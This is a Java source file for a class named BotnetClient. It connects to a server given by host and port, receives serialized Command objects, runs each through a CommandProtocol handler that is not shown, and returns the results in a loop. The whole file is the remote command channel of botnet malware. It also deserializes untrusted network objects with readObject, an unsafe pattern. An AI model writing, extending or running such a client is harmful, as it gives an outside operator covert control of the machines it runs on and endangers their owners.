import java.net.*;
import java.io.*;

/**
 * BotnetClient Class:
 * Object used to receive commands from server, process them, and send back to server
 */
public class BotnetClient {
    public static void main(String[] args) throws IOException {
        //Properties
        ObjectInputStream in = null;
        ObjectOutputStream out = null;
        Command inCommand = null;
        Socket socket = null;
        CommandProtocol commandP = new CommandProtocol();
        
        //make sure class is called correctly
        if (args.length != 2){
            System.err.println(
                "Usage: java EchoClient <host name> <port number>");
            System.exit(1);
        }

        String hostName = args[0];
        int portNumber = Integer.parseInt(args[1]);

        //bind the streams
        try{
            socket = new Socket(hostName, portNumber);
            out = new ObjectOutputStream(socket.getOutputStream());
            in = new ObjectInputStream(socket.getInputStream());
            inCommand = (Command) in.readObject();
        } catch (UnknownHostException e) {
            System.err.println("[-]Don't know about host " + hostName);
            System.exit(1);
        } catch (IOException e) {
            System.err.println("[-]Couldn't get I/O for the connection to " +
                hostName);
            System.exit(1);
        } catch (ClassNotFoundException e){
            System.err.println("[-]IMClient Class not found");
            System.exit(1);
        }

        //While there are commands being sent from the server
        while (inCommand != null){
            System.out.println("[+]Running Command " + inCommand.getCommandName());
            
            //get result from processing command
            String result = commandP.processCommand(inCommand);
            
            /**Debug prints */
            // System.out.println("[*]Command Result: " + result);
            // System.out.println("[*]Command Response: " + inCommand.getResponse());
            // System.out.println("[*]Command Error Status: " + inCommand.getErrorStatus());
            // System.out.println("[*]Command Is Executed: " + inCommand.getIsExecuted());

            //send command back to server
            out.writeObject(inCommand);
            //if the command running had an error then close the connection 
            if (inCommand.getErrorStatus() && inCommand.getIsExecuted()){
                break;
            }

            try{
                //if there was no error
                if (!inCommand.getErrorStatus())
                    //get the next command
                    inCommand = (Command) in.readObject();
            }
            catch (ClassNotFoundException cnfe){
                System.err.println("[-]BotNetClient: Problem reading object: class not found");
                System.err.println(cnfe);
                System.exit(1);
            }
        }
        //close streams
        out.close();
        in.close();
        socket.close();
    }    
}
